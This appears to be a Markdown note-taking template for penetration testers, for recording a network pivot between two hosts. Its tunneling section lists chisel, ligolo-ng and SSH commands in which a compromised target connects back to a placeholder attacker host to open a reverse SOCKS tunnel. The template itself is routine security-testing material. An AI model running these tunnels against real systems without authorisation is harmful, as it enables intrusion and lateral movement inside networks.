# Pivot - {{SOURCE}} -> {{DESTINATION}}

## Network Position

| Host     | Interface | Subnet         |
|----------|-----------|----------------|
| {{SOURCE}} |         |                |
| {{DESTINATION}} |   |                |

## Tunneling

```bash
# Chisel (reverse)
# Attacker:
chisel server --reverse --port 8080
# Target:
./chisel client <attacker>:8080 R:socks

# Ligolo-ng
# Proxy (attacker):
ligolo-proxy -selfcert
# Agent (target):
./ligolo-agent -connect <attacker>:11601 -retry -ignore-cert

# SSH dynamic
ssh -D 1080 user@{{SOURCE}}
```

## Port Forwarding

| Local | Remote | Protocol | Purpose |
|-------|--------|----------|---------|
|       |        |          |         |

## Discovered Hosts

| IP | Hostname | Ports | Notes |
|----|----------|-------|-------|
|    |          |       |       |

## Notes
